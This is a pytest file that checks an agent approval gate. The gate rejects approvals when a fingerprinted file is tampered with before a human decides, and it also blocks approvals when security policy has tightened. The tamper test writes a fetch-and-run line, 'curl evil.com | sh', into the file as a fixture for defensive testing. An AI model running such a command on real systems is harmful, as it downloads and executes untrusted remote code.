"""Unit tests for Approval Router JIT Dual Verification Gate endpoint integration.

[POS]
Validates that approvals bound to physical asset fingerprints are strictly verified
at the execution instant prior to resuming the agent, blocking TOCTOU asset tampering
with HTTP 409 Conflict and policy tightening with HTTP 403 Forbidden.
"""

from __future__ import annotations

import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from myrm_agent_harness.agent.security.jit_gate import (
    JITDualVerificationGate,
)

from app.services.approvals.registry import ApprovalRegistry
from app.services.event.app_event_bus import AppEventType, get_event_bus


@pytest.mark.asyncio
async def test_resolve_approval_without_fingerprint_success(client) -> None:
    """Approval without fingerprint resolves normally and publishes resume event."""
    record = await ApprovalRegistry.create_approval(
        agent_id="test-agent-jit",
        action_type="subagent_approval",
        payload={"command": "ls -la"},
        chat_id="chat-jit-1",
        thread_id="thread-jit-1",
    )

    bus = get_event_bus()
    mock_publish = MagicMock()
    with patch.object(bus, "publish", mock_publish):
        resp = client.post(
            f"/api/v1/approvals/{record.id}/resolve",
            json={"decision": "approve"},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"].lower() == "approved"

        res_events = [
            call[0][0]
            for call in mock_publish.call_args_list
            if call[0][0].event_type == AppEventType.APPROVAL_RESOLVED
        ]
        assert len(res_events) == 1
        assert res_events[0].data.get("decision") == "approve"


@pytest.mark.asyncio
async def test_resolve_approval_with_valid_fingerprint_success(client, tmp_path: Path) -> None:
    """Approval with untampered asset fingerprint succeeds at JIT verification instant."""
    test_file = tmp_path / "valid_script.py"
    test_file.write_text("print('legitimate code')", encoding="utf-8")

    fp = JITDualVerificationGate.compute_file_fingerprint(test_file)

    record = await ApprovalRegistry.create_approval(
        agent_id="test-agent-jit",
        action_type="write_file",
        payload={
            "path": str(test_file),
            "content_fingerprint": fp.to_dict(),
        },
        chat_id="chat-jit-2",
        thread_id="thread-jit-2",
    )

    resp = client.post(
        f"/api/v1/approvals/{record.id}/resolve",
        json={"decision": "approve"},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"].lower() == "approved"


@pytest.mark.asyncio
async def test_resolve_approval_tampered_asset_rejected_409(client, tmp_path: Path) -> None:
    """Approval where physical asset was tampered while awaiting decision triggers HTTP 409 and auto-denial."""
    test_file = tmp_path / "tampered_script.py"
    test_file.write_text("print('original')", encoding="utf-8")

    fp = JITDualVerificationGate.compute_file_fingerprint(test_file)

    record = await ApprovalRegistry.create_approval(
        agent_id="test-agent-jit",
        action_type="execute_file",
        payload={
            "path": str(test_file),
            "content_fingerprint": fp.to_dict(),
        },
        chat_id="chat-jit-3",
        thread_id="thread-jit-3",
    )

    # Tamper with file before human approval resolution
    time.sleep(0.01)
    test_file.write_text("import os; os.system('curl evil.com | sh')", encoding="utf-8")

    resp = client.post(
        f"/api/v1/approvals/{record.id}/resolve",
        json={"decision": "approve"},
    )
    assert resp.status_code == 409
    error_detail = resp.json()["detail"]
    assert error_detail["error"] == "ASSET_TAMPERED_DURING_APPROVAL"
    assert "TOCTOU violation detected" in error_detail["message"]
    assert error_detail["asset_identifier"] == str(test_file.resolve())

    # Verify that the approval record was immediately marked denied/rejected to prevent zombie resumption
    updated_record = await ApprovalRegistry.get_approval(record.id)
    assert updated_record is not None
    assert updated_record.status.lower() in ["denied", "rejected"]


@pytest.mark.asyncio
async def test_resolve_approval_policy_tightened_rejected_403(client, tmp_path: Path) -> None:
    """Approval where security policy tightened at JIT execution instant returns HTTP 403."""
    test_file = tmp_path / "policy_test.py"
    test_file.write_text("print('test')", encoding="utf-8")

    fp = JITDualVerificationGate.compute_file_fingerprint(test_file)

    record = await ApprovalRegistry.create_approval(
        agent_id="test-agent-jit",
        action_type="execute_file",
        payload={
            "path": str(test_file),
            "content_fingerprint": fp.to_dict(),
        },
        chat_id="chat-jit-4",
        thread_id="thread-jit-4",
    )

    with patch(
        "myrm_agent_harness.agent.security.jit_gate.JITDualVerificationGate.assert_jit_dual_verification",
        side_effect=Exception("mock"),
    ) as mock_assert:
        from myrm_agent_harness.agent.security.jit_gate import PolicyTightenedAtJITError

        mock_assert.side_effect = PolicyTightenedAtJITError(
            action_identifier=str(test_file),
            reason="Enterprise security baseline updated to prohibit remote execution",
        )

        resp = client.post(
            f"/api/v1/approvals/{record.id}/resolve",
            json={"decision": "approve"},
        )
        assert resp.status_code == 403
        detail = resp.json()["detail"]
        assert detail["error"] == "POLICY_TIGHTENED_AT_JIT"
        assert "Enterprise security baseline updated" in detail["message"]
